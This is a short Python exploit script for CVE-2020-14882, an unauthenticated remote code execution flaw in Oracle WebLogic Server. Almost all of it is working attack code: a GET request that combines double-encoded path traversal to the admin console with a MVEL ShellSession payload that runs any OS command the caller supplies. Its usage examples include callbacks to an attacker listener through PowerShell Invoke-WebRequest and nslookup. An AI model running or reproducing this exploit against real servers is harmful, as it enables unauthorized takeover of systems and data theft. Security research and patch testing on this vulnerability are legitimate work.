#!/usr/bin/python3

# Exploit Title: Oracle WebLogic Server 10.3.6.0.0 / 12.1.3.0.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0  - Unauthenticated RCE via GET request
# Exploit Author: Nguyen Jang
# CVE: CVE-2020-14882
# Vendor Homepage: https://www.oracle.com/middleware/technologies/weblogic.html
# Software Link: https://www.oracle.com/technetwork/middleware/downloads/index.html

# More Info: https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf

import requests
import sys

from urllib3.exceptions import InsecureRequestWarning

if len(sys.argv) != 3:
    print("[+] WebLogic Unauthenticated RCE via GET request")
    print("[+] Usage : python3 exploit.py http(s)://target:7001 command")
    print("[+] Example1 : python3 exploit.py http(s)://target:7001 \"nslookup your_Domain\"")
    print("[+] Example2 : python3 exploit.py http(s)://target:7001 \"powershell.exe -c Invoke-WebRequest -Uri http://your_listener\"")
    exit()

target = sys.argv[1]
command = sys.argv[2]

request = requests.session()
headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}

print("[+] Sending GET Request ....")

GET_Request = request.get(target + "/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('" + command + "');\");", verify=False, headers=headers)

print("[+] Done !!")